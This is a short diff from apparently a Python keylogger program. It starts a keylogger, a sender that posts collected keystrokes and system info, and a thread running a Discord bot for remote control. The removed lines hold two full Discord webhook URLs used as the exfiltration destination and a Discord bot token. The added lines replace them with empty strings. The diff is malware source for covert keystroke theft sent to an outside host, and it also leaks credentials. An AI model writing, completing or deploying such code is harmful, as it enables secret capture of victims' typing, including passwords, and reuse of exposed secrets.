@@ -27,8 +27,8 @@ keylogger = keylogger.Keylogger()
 sender = sender.Sender()
 
 keylogger.start()
-sender.webhook_log_url = 'https://discord.com/api/webhooks/1128326661000155248/nDG6sPvn8RitbJwHtDpm0Njy9xkOG_ajJBJfX-Hatd0RYuVymvpdD3IAgReuqj4BGam6?wait?true'
-sender.webhook_info_url = 'https://discord.com/api/webhooks/1128643994163871867/B9HL54arPjlrVqR2vAuWCnICe_ngD1k8hMjCxkuIlJhxkZ-cr24gZlgZz5oYZ8sczREJ?wait?true'
+sender.webhook_log_url = ''
+sender.webhook_info_url = ''
 sender.send_info()
 
 last_window = ''
@@ -70,7 +70,7 @@ def LogSend():
 			time_count = time_delay
 
 def BotControl():
-	bot.client.run('MTEyODYxNzQxNTE4MjM4OTM1OA.GsRgnf.P_JNFjMWJQrREknsvyDxxqkMAifoV8IHtoZ43k')
+	bot.client.run('')
 
 log_send = threading.Thread(target = LogSend, daemon=True)
 bot_th = threading.Thread(target = BotControl)
